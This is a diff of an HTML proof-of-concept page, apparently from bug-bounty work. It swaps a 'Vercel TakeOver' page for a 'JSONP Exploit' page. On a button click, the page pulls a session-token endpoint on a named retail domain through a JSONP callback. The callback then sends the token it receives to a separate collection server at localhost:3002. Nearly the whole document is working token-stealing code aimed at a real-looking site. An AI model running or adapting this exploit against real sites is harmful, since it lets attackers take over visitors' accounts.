@@ -1,10 +1,37 @@
+<!DOCTYPE html>
 <html>
 <head>
-<title>
-POC by BOB
-</title>
+<title>JSONP PoC</title>
 </head>
 <body>
-<h1>Vercel TakeOver by Bob on roblox.hilton.com</h1>
+
+<h1>JSONP Exploit<br>secureITmania</h1>
+<hr>
+<div id="demo">
+<button type="button" onclick="trigger()">Exploit</button>
+</div>
+<script>
+
+function testjsonp(myObj) {
+  var result = JSON.stringify(myObj);
+  document.getElementById("demo").innerHTML = result;
+  // Send the access token to the server
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "http://localhost:3002/receive-token", true);
+  xhr.setRequestHeader("Content-Type", "application/json");
+  xhr.send(result);
+}
+
+</script>
+
+<script >
+  
+  function trigger() {
+    var s = document.createElement("script");
+    s.src = "https://buy.jaybirdsport.com/store/logib2c/SessionToken?callback=testjsonp";
+    document.body.appendChild(s);
+}
+  
+</script>
 </body>
 </html>
